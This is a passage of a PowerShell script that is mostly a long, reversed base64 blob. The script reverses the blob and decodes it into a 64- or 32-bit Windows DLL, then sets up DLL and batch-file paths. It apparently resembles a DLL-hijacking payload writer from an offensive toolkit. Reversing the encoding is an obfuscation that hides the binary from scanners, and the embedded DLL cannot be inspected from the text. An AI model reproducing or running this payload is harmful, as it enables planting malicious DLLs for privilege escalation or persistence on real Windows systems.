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"

    $klass64 = ([regex]::Matches($zstring64,'.','RightToLeft') | ForEach {$_.value}) -join ''
    $DllBytes64 = $klass64

    if ($PSBoundParameters['Architecture']) {
        $TargetArchitecture = $Architecture
    }
    elseif ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
        $TargetArchitecture = 'x64'
    }
    else {
        $TargetArchitecture = 'x86'
    }

    if ($TargetArchitecture -eq 'x64') {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
    }
    else {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
    }

    if ($PSBoundParameters['BatPath']) {
        $TargetBatPath = $BatPath
    }
    else {
        $BasePath = $DllPath | Split-Path -Parent
